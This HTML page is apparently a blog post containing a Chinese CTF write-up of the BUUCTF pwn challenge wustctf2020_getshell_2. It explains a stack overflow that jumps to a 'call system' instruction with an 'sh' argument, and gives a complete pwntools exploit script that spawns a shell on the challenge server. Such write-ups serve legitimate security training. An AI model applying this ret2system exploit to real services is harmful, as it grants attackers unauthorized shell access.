@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="此题是一个非常简单的栈溢出，但是却从中学到了新知识  system 函数只需要”sh”便能 getshell 当 syscall 长度被限制（只有8个字节，如果写了返回地址就没法用参数了），解决办法是找到 call system 指令，直接使用这样就不用压入返回地址，就能省4个字节来压入”sh”的地址   1234567891011121314151617181920212223242526272">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUU｜PWN｜wustctf2020_getshell_2">
+<meta property="og:url" content="http://ybm911.work/2020/06/03/BUU%EF%BD%9CPWN%EF%BD%9Cwustctf2020-getshell-2/index.html">
+<meta property="og:site_name" content="Elli0t&#39;s Blog">
+<meta property="og:description" content="此题是一个非常简单的栈溢出，但是却从中学到了新知识  system 函数只需要”sh”便能 getshell 当 syscall 长度被限制（只有8个字节，如果写了返回地址就没法用参数了），解决办法是找到 call system 指令，直接使用这样就不用压入返回地址，就能省4个字节来压入”sh”的地址   1234567891011121314151617181920212223242526272">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217013838.png">
+<meta property="article:published_time" content="2020-06-03T08:38:46.000Z">
+<meta property="article:modified_time" content="2021-02-16T17:38:41.337Z">
+<meta property="article:author" content="Elli0t">
+<meta property="article:tag" content="PWN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217013838.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>BUU｜PWN｜wustctf2020_getshell_2</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="Elli0t's Blog" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/06/05/CTFwiki-for-PWN%EF%BD%9CFormat-String-Vulnerability-Principle/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/05/30/Raspi%EF%BD%9Cuhubctl-Siri-%E6%8E%A7%E5%88%B6-USB/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://ybm911.work/2020/06/03/BUU%EF%BD%9CPWN%EF%BD%9Cwustctf2020-getshell-2/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://ybm911.work/2020/06/03/BUU%EF%BD%9CPWN%EF%BD%9Cwustctf2020-getshell-2/&text=BUU｜PWN｜wustctf2020_getshell_2"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://ybm911.work/2020/06/03/BUU%EF%BD%9CPWN%EF%BD%9Cwustctf2020-getshell-2/&title=BUU｜PWN｜wustctf2020_getshell_2"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://ybm911.work/2020/06/03/BUU%EF%BD%9CPWN%EF%BD%9Cwustctf2020-getshell-2/&is_video=false&description=BUU｜PWN｜wustctf2020_getshell_2"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUU｜PWN｜wustctf2020_getshell_2&body=Check out this article: http://ybm911.work/2020/06/03/BUU%EF%BD%9CPWN%EF%BD%9Cwustctf2020-getshell-2/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://ybm911.work/2020/06/03/BUU%EF%BD%9CPWN%EF%BD%9Cwustctf2020-getshell-2/&title=BUU｜PWN｜wustctf2020_getshell_2"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://ybm911.work/2020/06/03/BUU%EF%BD%9CPWN%EF%BD%9Cwustctf2020-getshell-2/&title=BUU｜PWN｜wustctf2020_getshell_2"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://ybm911.work/2020/06/03/BUU%EF%BD%9CPWN%EF%BD%9Cwustctf2020-getshell-2/&title=BUU｜PWN｜wustctf2020_getshell_2"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://ybm911.work/2020/06/03/BUU%EF%BD%9CPWN%EF%BD%9Cwustctf2020-getshell-2/&title=BUU｜PWN｜wustctf2020_getshell_2"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://ybm911.work/2020/06/03/BUU%EF%BD%9CPWN%EF%BD%9Cwustctf2020-getshell-2/&name=BUU｜PWN｜wustctf2020_getshell_2&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://ybm911.work/2020/06/03/BUU%EF%BD%9CPWN%EF%BD%9Cwustctf2020-getshell-2/&t=BUU｜PWN｜wustctf2020_getshell_2"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">1.</span> <span class="toc-text">参考链接</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        BUU｜PWN｜wustctf2020_getshell_2
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Elli0t</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-06-03T08:38:46.000Z" itemprop="datePublished">2020-06-03</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/PWN/" rel="tag">PWN</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>此题是一个非常简单的栈溢出，但是却从中学到了新知识</p>
+<ul>
+<li>system 函数只需要”sh”便能 getshell</li>
+<li>当 syscall 长度被限制（只有8个字节，如果写了返回地址就没法用参数了），解决办法是找到 <code>call system</code> 指令，直接使用这样就不用压入返回地址，就能省4个字节来压入”sh”的地址</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/ybm911/blog_picture/img/20210217013838.png" alt="system"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal=[<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;sp&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line">LOCAL = <span class="literal">True</span></span><br><span class="line">BIN = <span class="string">&#x27;./wustctf2020_getshell_2&#x27;</span></span><br><span class="line">HOST = <span class="string">&#x27;node3.buuoj.cn&#x27;</span></span><br><span class="line">PORT = <span class="number">25450</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>(<span class="params">sh</span>):</span></span><br><span class="line">    s_h = <span class="number">0x08048670</span></span><br><span class="line">    system = <span class="number">0x8048529</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">28</span> + p32(system) + p32(s_h)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    sh.interactive()</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    elf = ELF(BIN)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">        LOCAL = <span class="literal">False</span></span><br><span class="line">        sh = remote(HOST,PORT)</span><br><span class="line">        exploit(sh)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        LOCAL = <span class="literal">True</span></span><br><span class="line">        sh = process(BIN)</span><br><span class="line">        log.info(<span class="string">&#x27;PID: &#x27;</span> + <span class="built_in">str</span>(proc.pidof(sh)[<span class="number">0</span>]))</span><br><span class="line">        <span class="comment"># pause</span></span><br><span class="line">        <span class="keyword">if</span> DEBUG:</span><br><span class="line">            gdb.attach(sh)</span><br><span class="line">        exploit(sh)</span><br></pre></td></tr></table></figure>
+<h6 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h6><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45461609/article/details/105166662">https://blog.csdn.net/weixin_45461609/article/details/105166662</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">1.</span> <span class="toc-text">参考链接</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://ybm911.work/2020/06/03/BUU%EF%BD%9CPWN%EF%BD%9Cwustctf2020-getshell-2/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://ybm911.work/2020/06/03/BUU%EF%BD%9CPWN%EF%BD%9Cwustctf2020-getshell-2/&text=BUU｜PWN｜wustctf2020_getshell_2"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://ybm911.work/2020/06/03/BUU%EF%BD%9CPWN%EF%BD%9Cwustctf2020-getshell-2/&title=BUU｜PWN｜wustctf2020_getshell_2"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://ybm911.work/2020/06/03/BUU%EF%BD%9CPWN%EF%BD%9Cwustctf2020-getshell-2/&is_video=false&description=BUU｜PWN｜wustctf2020_getshell_2"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUU｜PWN｜wustctf2020_getshell_2&body=Check out this article: http://ybm911.work/2020/06/03/BUU%EF%BD%9CPWN%EF%BD%9Cwustctf2020-getshell-2/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://ybm911.work/2020/06/03/BUU%EF%BD%9CPWN%EF%BD%9Cwustctf2020-getshell-2/&title=BUU｜PWN｜wustctf2020_getshell_2"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://ybm911.work/2020/06/03/BUU%EF%BD%9CPWN%EF%BD%9Cwustctf2020-getshell-2/&title=BUU｜PWN｜wustctf2020_getshell_2"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://ybm911.work/2020/06/03/BUU%EF%BD%9CPWN%EF%BD%9Cwustctf2020-getshell-2/&title=BUU｜PWN｜wustctf2020_getshell_2"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://ybm911.work/2020/06/03/BUU%EF%BD%9CPWN%EF%BD%9Cwustctf2020-getshell-2/&title=BUU｜PWN｜wustctf2020_getshell_2"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://ybm911.work/2020/06/03/BUU%EF%BD%9CPWN%EF%BD%9Cwustctf2020-getshell-2/&name=BUU｜PWN｜wustctf2020_getshell_2&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://ybm911.work/2020/06/03/BUU%EF%BD%9CPWN%EF%BD%9Cwustctf2020-getshell-2/&t=BUU｜PWN｜wustctf2020_getshell_2"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2021
+    Elli0t
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-49627206-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-49627206-1');
+    </script>
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?4cc1f2d8f3067386cc5cdb626a202900";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
